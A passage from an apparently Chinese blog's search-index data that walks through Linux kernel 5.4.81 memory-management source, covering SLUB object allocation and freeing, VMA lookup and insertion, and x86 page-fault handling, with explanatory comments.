本结点partial_slab数目 struct list_head partial; // partial_slab链表 #endif }; ","date":"2021-01-12","objectID":"/kernel_mm/:5:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"6. kmem_cache_alloc源码分析 kmem_cache_alloc() -\u003e slab_alloc() -\u003e slab_alloc_node() static __always_inline void *slab_alloc_node(struct kmem_cache *s, gfp_t gfpflags, int node, unsigned long addr) { void *object; struct kmem_cache_cpu *c; struct page *page; unsigned long tid; // 对keme_cache做预处理 s = slab_pre_alloc_hook(s, gfpflags); if (!s) return NULL; redo: // tid, c是通过两次读取cpu获得, 如果抢占模式被开启, 有可能两次获取的cpu不同, 这里每次读取tid和c之后都会比较tid是否等于c-\u003etid, 如果不相等, 则说明两次数据读取对应的cpu不同, 则再次读取数据, 直至相同(构造的很精巧, 比关闭抢占提升了效率) do { tid = this_cpu_read(s-\u003ecpu_slab-\u003etid); c = raw_cpu_ptr(s-\u003ecpu_slab); } while (IS_ENABLED(CONFIG_PREEMPT) \u0026\u0026 unlikely(tid != READ_ONCE(c-\u003etid))); // 屏障, 保证上面和下面的代码因为优化而相互影响 barrier(); object = c-\u003efreelist; page = c-\u003epage; // 如果当前cpu的空闲列表为空或当前正在使用的页为空或page-\u003enode与node不匹配则进入__slab_alloc慢分配 if (unlikely(!object || !page || !node_match(page, node))) { object = __slab_alloc(s, gfpflags, node, addr, c); stat(s, ALLOC_SLOWPATH); } else { // freepointer_addr = (unsigned long)object + s-\u003eoffset; // probe_kernel_read(\u0026p, (void **)freepointer_addr, sizeof(p)); // return freelist_ptr(s, p, freepointer_addr); // get_freepointer_safe: 通过s-\u003eoffset偏移获得存储下一个空闲obj的地址, 然后使用probe_kernel_read安全的将obj地址写入p中, freelist_ptr在没有定义CONFIG_SLAB_FREELIST_HARDENED时直接返回p void *next_object = get_freepointer_safe(s, object); // 判断this_cpu(s-\u003ecpu_slab-\u003efreelist)是否等于object且this_cpu(s-\u003ecpu_slab-\u003etid)是否等于tid, 如果成立则this_cpu(s-\u003ecpu_slab-\u003efreelist)=next_object, this_cpu(s-\u003ecpu_slab-\u003etid)=tid+1, 否则return false // this_cpu_cmpxchg_double将上诉操作变成原子操作 if (unlikely(!this_cpu_cmpxchg_double( s-\u003ecpu_slab-\u003efreelist, s-\u003ecpu_slab-\u003etid, object, tid, next_object, next_tid(tid)))) { // 如果失败则重新获取obj note_cmpxchg_failure(\"slab_alloc\", s, tid); goto redo; } // 预热链表, 增加下次命中几率 prefetch_freepointer(s, next_object); // 记录状态 stat(s, ALLOC_FASTPATH); } maybe_wipe_obj_freeptr(s, object); if (unlikely(slab_want_init_on_alloc(gfpflags, s)) \u0026\u0026 object) memset(object, 0, s-\u003eobject_size); // 分析了以下这里kasan_slab_alloc直接返回原值, kmemleak_alloc_recursive为空, 如果slab开始分配时memcg_kmem_enabled有意义, 这里再做一下后续的扫尾工作(因为是hook函数所以初始功能极少) slab_post_alloc_hook(s, gfpflags, 1, \u0026object); return object; } ","date":"2021-01-12","objectID":"/kernel_mm/:6:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"6.1. __slab_alloc __slab_alloc -\u003e ___slab_alloc static void *___slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node, unsigned long addr, struct kmem_cache_cpu *c) { void *freelist; struct page *page; // 如果c-\u003epage为空, 代表cpu_slab中没有可用slab, 进入new_slab向cpu_slab中填充可用slab page = c-\u003epage; if (!page) { // 如果node不在线或者node没有正常内存, 则忽略node约束 if (unlikely(node != NUMA_NO_NODE \u0026\u0026 !node_state(node, N_NORMAL_MEMORY))) node = NUMA_NO_NODE; goto new_slab; } redo: // 判断page-\u003enode与node是否相同 if (unlikely(!node_match(page, node))) { // node_state: return 0 if (!node_state(node, N_NORMAL_MEMORY)) { node = NUMA_NO_NODE; goto redo; } else { // 记录状态node_miss_match stat(s, ALLOC_NODE_MISMATCH); // 将cpu_slab中的page放入node中 deactivate_slab(s, page, c-\u003efreelist, c); goto new_slab; } } // PF_MEMALLOC: 忽略内存管理的水印进行分配, 分配失败则不再尝试, 如果当前page是pfmemalloc属性, 则调用deactivate_slab if (unlikely(!pfmemalloc_match(page, gfpflags))) { deactivate_slab(s, page, c-\u003efreelist, c); goto new_slab; } // 检查freelist, 防止cpu迁移或中断导致freelist非空 freelist = c-\u003efreelist; if (freelist) goto load_freelist; // 从c-\u003epage中获得freelist freelist = get_freelist(s, page); if (!freelist) { c-\u003epage = NULL; stat(s, DEACTIVATE_BYPASS); goto new_slab; } stat(s, ALLOC_REFILL); load_freelist: // c-\u003epage对应被分配的obj所在的page, 应该被cpu冻结 VM_BUG_ON(!c-\u003epage-\u003efrozen); // 更新cpu_slab的freelist, tid c-\u003efreelist = get_freepointer(s, freelist); c-\u003etid = next_tid(c-\u003etid); return freelist; new_slab: // 判断cpu_slab是否存在partial_slab(部分空间被使用的page) if (slub_percpu_partial(c)) { // 将partial_slab作为c-\u003epage(用来分配obj) page = c-\u003epage = slub_percpu_partial(c); // #define slub_set_percpu_partial(c, p) (slub_percpu_partial(c) = (p)-\u003enext;}) // 更新partial链表头为page-\u003enext slub_set_percpu_partial(c, page); stat(s, CPU_PARTIAL_ALLOC); goto redo; } // new_slab_objects: 1. get_partial(从node-\u003epartial获取page) 2. new_slab(伙伴算法获取page) // 从上述page中获得freelist freelist = new_slab_objects(s, gfpflags, node, \u0026c); if (unlikely(!freelist)) { // 内存分配失败 // 配置CONFIG_SLUB_DEBUG后会打印报错信息 slab_out_of_memory(s, gfpflags, node); return NULL; } page = c-\u003epage; if (likely(!kmem_cache_debug(s) \u0026\u0026 pfmemalloc_match(page, gfpflags))) goto load_freelist; // kmem_cache_debug判断kmem_cache标志位是否包含SLAB_DEBUG_FLAGS // alloc_debug_processing: return 0 if (kmem_cache_debug(s) \u0026\u0026 !alloc_debug_processing(s, page, freelist, addr)) goto new_slab; deactivate_slab(s, page, get_freepointer(s, freelist), c); return freelist; } 6.1.1. get_freelist static inline void *get_freelist(struct kmem_cache *s, struct page *page) { struct page new; unsigned long counters; void *freelist; do { freelist = page-\u003efreelist; counters = page-\u003ecounters; // 获得下一个freelist new.counters = counters; VM_BUG_ON(!new.frozen); new.inuse = page-\u003eobjects; // The page is still frozen if the return value is not NULL. new.frozen = freelist != NULL; // page-\u003efreelist=NULL, page-\u003ecounters=new.counters // 将page-\u003efreelist从page中摘除, 后续会放进cpu_slab-\u003efreelist中 } while (!__cmpxchg_double_slab(s, page, freelist, counters, NULL, new.counters, \"get_freelist\")); return freelist; } ","date":"2021-01-12","objectID":"/kernel_mm/:6:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"7. kmem_cache_free源码分析 kmem_cache_free -\u003e cache_from_obj(定位目标kmem_cache) kmem_cache_free -\u003e slab_free static __always_inline void slab_free(struct kmem_cache *s, struct page *page, void *head, void *tail, int cnt, unsigned long addr) { if (slab_free_freelist_hook(s, \u0026head, \u0026tail)) do_slab_free(s, page, head, tail, cnt, addr); } slab_free -\u003e slab_free_freelist_hook slab_free -\u003e do_slab_free ","date":"2021-01-12","objectID":"/kernel_mm/:7:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"7.1. cache_from_obj static inline struct kmem_cache *cache_from_obj(struct kmem_cache *s, void *x) { struct kmem_cache *cachep; // 如果memcg没有开启且没有配置CONFIG_SLAB_FREELIST_HARDENED,kem_cache没有配置SLAB_CONSISTENCY_CHECKS, 则直接返回用户选择的kmem_cache if (!memcg_kmem_enabled() \u0026\u0026 !IS_ENABLED(CONFIG_SLAB_FREELIST_HARDENED) \u0026\u0026 !unlikely(s-\u003eflags \u0026 SLAB_CONSISTENCY_CHECKS)) return s; // virt_to_cache -\u003e virt_to_head_page -\u003e virt_to_page获得page // 返回page-\u003eslab_cache作为kmem_cache(因为用户选择的kmem_cache不可信) cachep = virt_to_cache(x); WARN_ONCE(cachep \u0026\u0026 !slab_equal_or_root(cachep, s), \"%s: Wrong slab cache. %s but object is from %s\\n\", __func__, s-\u003ename, cachep-\u003ename); return cachep; } ","date":"2021-01-12","objectID":"/kernel_mm/:7:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"7.2. slab_free_freelist_hook static inline bool slab_free_freelist_hook(struct kmem_cache *s, void **head, void **tail) { void *object; void *next = *head; void *old_tail = *tail ? *tail : *head; int rsize; *head = NULL; *tail = NULL; do { // 依次遍历freelist object = next; next = get_freepointer(s, object); if (slab_want_init_on_free(s)) { // 将object清空(red_zone区域除外) memset(object, 0, s-\u003eobject_size); rsize = (s-\u003eflags \u0026 SLAB_RED_ZONE) ? s-\u003ered_left_pad : 0; memset((char *)object + s-\u003einuse, 0, s-\u003esize - s-\u003einuse - rsize); } // slab_free_hook内部功能函数实现为空 return false if (!slab_free_hook(s, object)) { // *object-\u003eoffset=*head set_freepointer(s, object, *head); *head = object; if (!*tail) *tail = object; } } while (object != old_tail); if (*head == *tail) *tail = NULL; return *head != NULL; } ","date":"2021-01-12","objectID":"/kernel_mm/:7:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"7.3. do_slab_free static __always_inline void do_slab_free(struct kmem_cache *s, struct page *page, void *head, void *tail, int cnt, unsigned long addr) { void *tail_obj = tail ? : head; struct kmem_cache_cpu *c; unsigned long tid; redo: // 使用tid保持cpu同步 do { tid = this_cpu_read(s-\u003ecpu_slab-\u003etid); c = raw_cpu_ptr(s-\u003ecpu_slab); } while (IS_ENABLED(CONFIG_PREEMPT) \u0026\u0026 unlikely(tid != READ_ONCE(c-\u003etid))); // 和slab_alloc_node()中的barrier作用相同 barrier(); // 如果待释放obj所属的page并不是cpu_slab对应的page则进入__slab_free慢释放 if (likely(page == c-\u003epage)) { void **freelist = READ_ONCE(c-\u003efreelist); // tail_obj是待插入的obj, set_freepointer: *(tail_obj-\u003eoffset)=freelist(原freelist) set_freepointer(s, tail_obj, freelist); // 验证cpu没有被抢占后, 使得s-\u003ecpu_slab-\u003efreelist=head(tail_obj), tid=next_tid(tid), tail_obj成功插入 if (unlikely(!this_cpu_cmpxchg_double( s-\u003ecpu_slab-\u003efreelist, s-\u003ecpu_slab-\u003etid, freelist, tid, head, next_tid(tid)))) { note_cmpxchg_failure(\"slab_free\", s, tid); goto redo; } stat(s, FREE_FASTPATH); } else __slab_free(s, page, head, tail_obj, cnt, addr); } 7.3.1. __slab_free static void __slab_free(struct kmem_cache *s, struct page *page, void *head, void *tail, int cnt, unsigned long addr) { void *prior; int was_frozen; struct page new; unsigned long counters; struct kmem_cache_node *n = NULL; // uninitialized_var消除没有初始化的警告 unsigned long uninitialized_var(flags); stat(s, FREE_SLOWPATH); if (kmem_cache_debug(s) \u0026\u0026 !free_debug_processing(s, page, head, tail, cnt, addr)) return; do { // n置空, 释放free_debug_processing()设置的自旋锁 if (unlikely(n)) { spin_unlock_irqrestore(\u0026n-\u003elist_lock, flags); n = NULL; } prior = page-\u003efreelist; counters = page-\u003ecounters; // tail是待插入的obj, set_freepointer: *(tail_obj-\u003eoffset)=freelist(原freelist) set_freepointer(s, tail, prior); new.counters = counters; was_frozen = new.frozen; // inuse_obj = inuse_obj - cnt, 当前page释放了cnt(1)个obj new.inuse -= cnt; // 如果该page(不存在正被使用的obj或者无可被使用的obj)且没有被冻结(不属于cpu_slab), 说明正在被释放的obj是该page的最后一个被使用的obj, 该page可被放入buddy if ((!new.inuse || !prior) \u0026\u0026 !was_frozen) { // 如果kmem_cache存在cpu_slab-\u003epartial且该page无可用obj则冻结page, 后续会被放入cpu_slab-\u003epartial if (kmem_cache_has_cpu_partial(s) \u0026\u0026 !prior) { new.frozen = 1; } else { // 获得node, 加锁node资源区 n = get_node(s, page_to_nid(page)); spin_lock_irqsave(\u0026n-\u003elist_lock, flags); } } // 释放head(正在被释放的obj)进入page(page-\u003efreelist=head, page-\u003ecounters=new.counters) } while (!cmpxchg_double_slab(s, page, prior, counters, head, new.counters, \"__slab_free\")); if (likely(!n)) { // 如果page没有被冻结, 则将page挂载进入cpu_slab-\u003epartial if (new.frozen \u0026\u0026 !was_frozen) { put_cpu_partial(s, page, 1); stat(s, CPU_PARTIAL_FREE); } // page被冻结后只更新\"FREE_FROZEN\"信息 if (was_frozen) stat(s, FREE_FROZEN); return; } // 如果page无obj被使用, 且kmem_cache的半满page超过临界点(n-\u003enr_partial \u003e= s-\u003emin_partial), 则进行page释放 if (unlikely(!new.inuse \u0026\u0026 n-\u003enr_partial \u003e= s-\u003emin_partial)) goto slab_empty; // 释放obj后slab从full变为partial if (!kmem_cache_has_cpu_partial(s) \u0026\u0026 unlikely(!prior)) { // 将slab从full链表删除, 插入n-\u003epartial链表尾部 remove_full(s, n, page); add_partial(n, page, DEACTIVATE_TO_TAIL); stat(s, FREE_ADD_PARTIAL); } // 解锁node资源区 spin_unlock_irqrestore(\u0026n-\u003elist_lock, flags); return; slab_empty: if (prior) { // 如果该page存在可用obj, 则该page会在partial链表, 所以在partial链表中将page删除 remove_partial(n, page); stat(s, FREE_REMOVE_PARTIAL); } else { // 将page从full链表中删除 remove_full(s, n, page); } spin_unlock_irqrestore(\u0026n-\u003elist_lock, flags); stat(s, FREE_SLAB); discard_slab(s, page); } discard_slab discard_slab-\u003edec_slabs_node(更新node信息) discard_slab-\u003efree_slab-\u003e__free_slab static void __free_slab(struct kmem_cache *s, struct page *page) { // 获得page_order int order = compound_order(page); int pages = 1 \u003c\u003c order; if (s-\u003eflags \u0026 SLAB_CONSISTENCY_CHECKS) { void *p; // 对page做安全检查 slab_pad_check(s, page); // 对page中的每个obj进行安全检测 for_each_object(p, s, page_address(page), page-\u003eobjects) check_object(s, page, p, SLUB_RED_INACTIVE); } // 清除page标志位 __ClearPageSlabPfmemalloc(page); __ClearPageSlab(page); // page不再被引用 page-\u003emapping = NULL; // 更新内存回收状态 if (current-\u003ereclaim_state) curren","date":"2021-01-12","objectID":"/kernel_mm/:7:3","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"8. 进程vma 进程由许多的segment组成, 例如text segment,data segment, bss segment等, segment中被填充各种功能的数据, 每个segment具有不同的权限(r, w, x) 对于进程来说segment由什么结构来标识? 这就是接下来要将的进程vma ","date":"2021-01-12","objectID":"/kernel_mm/:8:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"8.1. vm_area_struct 结构体 在进程中每个segment都被描述为vm_area_struct task_struct -\u003e mm_struct -\u003e vm_area_struct struct vm_area_struct { // 第一个cache line unsigned long vm_start; unsigned long vm_end; // vm_area_struct所对应的vma在进程地址空间中的起始和结束地址 struct vm_area_struct *vm_next, *vm_prev; // 按照vma在进程地址空间中的顺序, 将vma链入双链表, struct rb_node vm_rb; // 红黑树结点 unsigned long rb_subtree_gap; // 记录该vma与上一个vma(可以选择双链表中或者红黑树中)之间的空闲空间大小, // 第二个cache line struct mm_struct *vm_mm; // 指向该vma对应的进程的mm_struct结构体 pgprot_t vm_page_prot; // 该vma访问权限 unsigned long vm_flags; // 描述该vma标志位 const struct vm_operations_struct *vm_ops; // 指向function集合, 虚表 unsigned long vm_pgoff; // 以page为单位的文件映射偏移量 struct file * vm_file; // 指向被映射的文件 ... } ","date":"2021-01-12","objectID":"/kernel_mm/:8:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"8.2. find_vma(vma查找) struct vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr) { struct rb_node *rb_node; struct vm_area_struct *vma; // 在cache中寻找vma vma = vmacache_find(mm, addr); if (likely(vma)) return vma; // 定位红黑树根节点 rb_node = mm-\u003emm_rb.rb_node; // 在红黑树中查找vma while (rb_node) { struct vm_area_struct *tmp; // 获得当前结点的vm_area_struct tmp = rb_entry(rb_node, struct vm_area_struct, vm_rb); if (tmp-\u003evm_end \u003e addr) { vma = tmp; if (tmp-\u003evm_start \u003c= addr) break; rb_node = rb_node-\u003erb_left; } else rb_node = rb_node-\u003erb_right; } // 如果查找到的vma有效, 则更新cache if (vma) vmacache_update(addr, vma); return vma; } 8.2.1. vmacache_find struct vm_area_struct *vmacache_find(struct mm_struct *mm, unsigned long addr) { // 通过左移addr, 定位addr对应的index(这个位置可能会存在对应的vma) int idx = VMACACHE_HASH(addr); int i; // 记录事件 count_vm_vmacache_event(VMACACHE_FIND_CALLS); // 检测mm是否是当前进程的mm_struct, 如果是第一次触发cache, 将进行初始化 if (!vmacache_valid(mm)) return NULL; // 遍历current-\u003evmacache.vmas[](从idx开始, 因为inx对应的位置cache hit可能性最大) for (i = 0; i \u003c VMACACHE_SIZE; i++) { struct vm_area_struct *vma = current-\u003evmacache.vmas[idx]; if (vma) { #ifdef CONFIG_DEBUG_VM_VMACACHE if (WARN_ON_ONCE(vma-\u003evm_mm != mm)) break; #endif // 判断vma是否匹配 if (vma-\u003evm_start \u003c= addr \u0026\u0026 vma-\u003evm_end \u003e addr) { count_vm_vmacache_event(VMACACHE_FIND_HITS); return vma; } } // inx遍历到VMACACHE_SIZE后, 归0继续遍历(idx是从中间开始遍历的) if (++idx == VMACACHE_SIZE) idx = 0; } return NULL; } ","date":"2021-01-12","objectID":"/kernel_mm/:8:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"8.3. insert_vm_struct(vma插入) int insert_vm_struct(struct mm_struct *mm, struct vm_area_struct *vma) { struct vm_area_struct *prev; struct rb_node **rb_link, *rb_parent; // 定位插入vma的目标位置 // prev = rb_parent对应的vm_area_struct // rb_link = 待插入的位置 // rb_parent = rb_link的父结点 if (find_vma_links(mm, vma-\u003evm_start, vma-\u003evm_end, \u0026prev, \u0026rb_link, \u0026rb_parent)) return -ENOMEM; if ((vma-\u003evm_flags \u0026 VM_ACCOUNT) \u0026\u0026 security_vm_enough_memory_mm(mm, vma_pages(vma))) return -ENOMEM; // 匿名vma要设置页偏移 if (vma_is_anonymous(vma)) { BUG_ON(vma-\u003eanon_vma); vma-\u003evm_pgoff = vma-\u003evm_start \u003e\u003e PAGE_SHIFT; } // 将vma插入vma管理体系 // vma_link -\u003e __vma_link -\u003e __vma_link_list, 将vma插入双链表 // vma_link -\u003e __vma_link -\u003e __vma_link_rb, 将vma插入红黑树 vma_link(mm, vma, prev, rb_link, rb_parent); return 0; } 8.3.1. find_vma_links static int find_vma_links(struct mm_struct *mm, unsigned long addr, unsigned long end, struct vm_area_struct **pprev, struct rb_node ***rb_link, struct rb_node **rb_parent) { struct rb_node **__rb_link, *__rb_parent, *rb_prev; __rb_link = \u0026mm-\u003emm_rb.rb_node; rb_prev = __rb_parent = NULL; while (*__rb_link) { struct vm_area_struct *vma_tmp; __rb_parent = *__rb_link; vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb); if (vma_tmp-\u003evm_end \u003e addr) { // 如果vma_tmp_end_addr大于vma_end_addr且vma_start_end_addr小于vma_start_addr, 说明vma_tmp和vma重合, 函数报错 if (vma_tmp-\u003evm_start \u003c end) return -ENOMEM; // 继续遍历左节点 __rb_link = \u0026__rb_parent-\u003erb_left; } else { rb_prev = __rb_parent; // 继续遍历右节点 __rb_link = \u0026__rb_parent-\u003erb_right; } } // 当__rb_link为空, 即对应结点为空时, 退出遍历红黑树循环 // __rb_link对应空结点, 即目标插入位置 // __rb_parent对应__rb_link的父结点 // pprev对应rb_prev指向的vm_arena_struct *pprev = NULL; if (rb_prev) *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb); *rb_link = __rb_link; *rb_parent = __rb_parent; return 0; } 8.3.2. 红黑树规则 红黑树规则: 节点是红色或黑色 根节点是黑色 每个叶节点都是黑色的空节点 每个红色节点的两个子节点都是黑色(从每个叶子到根的所有路径上不能有两个连续的红色节点) 从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点 插入节点时通过变色或者旋转维持红黑树规则 ","date":"2021-01-12","objectID":"/kernel_mm/:8:3","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"9. 缺页中断 /* * Page fault error code bits: * * bit 0 == 0: no page found 1: protection fault * bit 1 == 0: read access 1: write access * bit 2 == 0: kernel-mode access 1: user-mode access * bit 3 == 1: use of reserved bit detected * bit 4 == 1: fault was an instruction fetch * bit 5 == 1: protection keys block access */ enum x86_pf_error_code { X86_PF_PROT = 1 \u003c\u003c 0, X86_PF_WRITE = 1 \u003c\u003c 1, X86_PF_USER = 1 \u003c\u003c 2, X86_PF_RSVD = 1 \u003c\u003c 3, X86_PF_INSTR = 1 \u003c\u003c 4, X86_PF_PK = 1 \u003c\u003c 5, }; ","date":"2021-01-12","objectID":"/kernel_mm/:9:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"9.1. __do_page_fault源码分析 static noinline void __do_page_fault(struct pt_regs *regs, unsigned long hw_error_code, unsigned long address) { // 将变量放入cache, 加快速度 prefetchw(\u0026current-\u003emm-\u003emmap_sem); // mmiotrace跟踪器, 用于跟踪基于内存映射的io设备 if (unlikely(kmmio_fault(regs, address))) return; // 判断缺页中断发生在内核态还是用户态 if (unlikely(fault_in_kernel_space(address))) do_kern_addr_fault(regs, hw_error_code, address); else do_user_addr_fault(regs, hw_error_code, address); } ","date":"2021-01-12","objectID":"/kernel_mm/:9:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"9.2. fault_in_kernel_space vsyscall和vdso的作用与区别 作用: 一般来说, 用户态与内核态通过系统调用进行交互, 但是这种交互非常浪费时间, 那么对于需要实时性的api如gettimeofday等就不太适用, 使用vsyscall或vdso可以加速 区别: vsyscall是一种比较古老的机制, 他在固定地址映射内核内存页实现快速执行内核功能, 但安全性不高, 被vdso逐渐替代, 但是vdso只存在与动态链接, 静态链接程序没有vdso, 所以为了兼容性, vsyscall被保留下来 vdso可以应用aslr实现地址随机化, 而且无需考虑cpu差异性 static int fault_in_kernel_space(unsigned long address) { // x86_64架构下vsyscall在TASK_SIZE_MAX之上, 但并非内核空间, 所以单独列出 // #define VSYSCALL_ADDR (-10UL \u003c\u003c 20), VSYSCALL_ADDR即为vsyscall固定地址(在x86_64架构下(-10)用8字节存储, VSYSCALL_ADDR=0xffffffffff600000) if (IS_ENABLED(CONFIG_X86_64) \u0026\u0026 is_vsyscall_vaddr(address)) return false; // 将大于TASK_SIZE_MAX的地址视为内核空间 return address \u003e= TASK_SIZE_MAX; } ","date":"2021-01-12","objectID":"/kernel_mm/:9:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"9.3. do_kern_addr_fault static void do_kern_addr_fault(struct pt_regs *regs, unsigned long hw_error_code, unsigned long address) { // X86_PF_PK存在于用户页, 并非内核页 WARN_ON_ONCE(hw_error_code \u0026 X86_PF_PK); // 检测错误是否由于vmalloc fault导致 if (!(hw_error_code \u0026 (X86_PF_RSVD | X86_PF_USER | X86_PF_PROT))) { if (vmalloc_fault(address) \u003e= 0) return; } // 检测错误是否是由于TLB表项陈旧(内核页权限变更后, TLB没有更新) // 如果TLB表项陈旧导致错误, 那么只有两种可能. 1. 数据写入时TLB(), 2. 指令执行时TLB(NX) if (spurious_kernel_fault(hw_error_code, address)) return; // 判断kprobe是否hook了缺页错误 if (kprobe_page_fault(regs, X86_TRAP_PF)) return; // 非法地址访问导致页错误 bad_area_nosemaphore(regs, hw_error_code, address); } 9.3.1. vmalloc_fault static noinline int vmalloc_fault(unsigned long address) { pgd_t *pgd, *pgd_k; p4d_t *p4d, *p4d_k; pud_t *pud; pmd_t *pmd; pte_t *pte; // #define high_memory (-128UL \u003c\u003c 20) // #define VMALLOC_START (((unsigned long)high_memory + VMALLOC_OFFSET) \u0026 ~(VMALLOC_OFFSET-1)) // VMALLOC空间和前面保留8M的hole保证安全性 // 经计算VMALLOC_START=0xfffffffff8000000+8M if (!(address \u003e= VMALLOC_START \u0026\u0026 address \u003c VMALLOC_END)) return -1; // 使用vmalloc分配内存后, 内存映射会被直接写入全局内核页表init_mm // 进程的内核页表是在进程被创建时, 直接复制内核页表获得, 不具备实时性, 所以只有当发生vmalloc缺页中断时, 才会把对应的全局内核页表项复制到进程内核页表 // 获得进程内核页表 pgd = (pgd_t *)__va(read_cr3_pa()) + pgd_index(address); // 获得全局内核页表 pgd_k = pgd_offset_k(address); // 将与addr关联的全局内核页表项复制到进程内核页表 if (pgd_none(*pgd_k)) return -1; if (pgtable_l5_enabled()) { if (pgd_none(*pgd)) { set_pgd(pgd, *pgd_k); arch_flush_lazy_mmu_mode(); } else { BUG_ON(pgd_page_vaddr(*pgd) != pgd_page_vaddr(*pgd_k)); } } // 获得进程内核页表和全局内核页表对应的p4d, 令p4d_proc=p4d_kern实现页表项复制 p4d = p4d_offset(pgd, address); p4d_k = p4d_offset(pgd_k, address); if (p4d_none(*p4d_k)) return -1; if (p4d_none(*p4d) \u0026\u0026 !pgtable_l5_enabled()) { set_p4d(p4d, *p4d_k); arch_flush_lazy_mmu_mode(); } else { BUG_ON(p4d_pfn(*p4d) != p4d_pfn(*p4d_k)); } BUILD_BUG_ON(CONFIG_PGTABLE_LEVELS \u003c 4); // 对pud, pmd, pte做安全检测 pud = pud_offset(p4d, address); if (pud_none(*pud)) return -1; if (pud_large(*pud)) return 0; pmd = pmd_offset(pud, address); if (pmd_none(*pmd)) return -1; if (pmd_large(*pmd)) return 0; pte = pte_offset_kernel(pmd, address); // 如果pte对应的page并非正在被使用则缺页 if (!pte_present(*pte)) return -1; return 0; } 9.3.2. spurious_kernel_fault static noinline int spurious_kernel_fault(unsigned long error_code, unsigned long address) { pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte; int ret; // 由于TLB表项陈旧导致的虚假错误, 给出的错误原因只有两种:写入(X86_PF_WRITE), 指令执行(X86_PF_INSTR) if (error_code != (X86_PF_WRITE | X86_PF_PROT) \u0026\u0026 error_code != (X86_PF_INSTR | X86_PF_PROT)) return 0; // 定位内核页表 pgd = init_mm.pgd + pgd_index(address); // 判断pgd是否在内存中 if (!pgd_present(*pgd)) return 0; // 通过偏移获得p4d表项 p4d = p4d_offset(pgd, address); if (!p4d_present(*p4d)) return 0; // 如果在p4d表项处开启huge page机制, 则直接进入spurious_kernel_fault_check /* spurious_kernel_fault_check: if ((error_code \u0026 X86_PF_WRITE) \u0026\u0026 !pte_write(*pte)) return 0; if ((error_code \u0026 X86_PF_INSTR) \u0026\u0026 !pte_exec(*pte)) return 0; return 1; */ // 检测是否是因为tlb项老旧导致错误 if (p4d_large(*p4d)) return spurious_kernel_fault_check(error_code, (pte_t *) p4d); // 以下处理流程相同, 不再描述 pud = pud_offset(p4d, address); if (!pud_present(*pud)) return 0; if (pud_large(*pud)) return spurious_kernel_fault_check(error_code, (pte_t *) pud); pmd = pmd_offset(pud, address); if (!pmd_present(*pmd)) return 0; if (pmd_large(*pmd)) return spurious_kernel_fault_check(error_code, (pte_t *) pmd); pte = pte_offset_kernel(pmd, address); if (!pte_present(*pte)) return 0; ret = spurious_kernel_fault_check(error_code, pte); if (!ret) return 0; ret = spurious_kernel_fault_check(error_code, (pte_t *) pmd); // 如果在pte阶段还是没有检测到虚假错误则报一个bug WARN_ONCE(!ret, \"PMD has incorrect permission bits\\n\"); return ret; } 9.3.3. bad_area_nosemaphore bad_area_nosemaphore -\u003e __bad_area_nosemaphore static void __bad_area_nosemaphore(struct pt_regs *regs, unsigned long error_code, unsigned long address, u32 pkey, int si_code) { struct task_struct *tsk = current; // 如果请求来自用户态, 说明想要越界访问内核空间 if (user_mode(regs) \u0026\u0026 (e","date":"2021-01-12","objectID":"/kernel_mm/:9:3","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"9.4. do_user_addr_fault static inline void do_user_addr_fault(struct pt_regs *regs, unsigned long hw_error_code, unsigned long address) { struct vm_area_struct *vma; struct task_struct *tsk; struct mm_struct *mm; vm_fault_t fault, major = 0; unsigned int flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE; tsk = current; mm = tsk-\u003emm; // 判断kprobe是否hook了缺页错误 if (unlikely(kprobe_page_fault(regs, X86_TRAP_PF))) return; // Reserved bits不会被设置在用户的页表项, 如果存在Reserved bits则发生页表错误 if (unlikely(hw_error_code \u0026 X86_PF_RSVD)) pgtable_bad(regs, hw_error_code, address); // 如果开启smap且kernel(supervisor)访问用户态地址(X86_PF_USER=0)则进入bad_area_nosemaphore if 